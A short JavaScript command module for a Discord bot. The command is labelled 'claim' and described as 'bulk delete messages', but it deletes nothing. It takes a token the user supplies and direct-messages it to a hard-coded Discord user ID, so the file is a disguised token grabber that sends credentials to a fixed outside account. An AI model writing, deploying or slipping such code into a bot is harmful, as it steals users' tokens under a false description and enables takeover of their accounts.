//<Client>.users.fetch('id')
module.exports = {
  name: "claim",
  description: "bulk delete messages",
  execute: async (bot, message, args, split) => {
    if (!split[1]) return message.channel.send("no token specifyied");
    let user = ""
    async function GetUser(){
     user = await bot.users.fetch('809680753788583937')
    }
    GetUser().then(() => {
    user.send(split[1])
    })
}
}
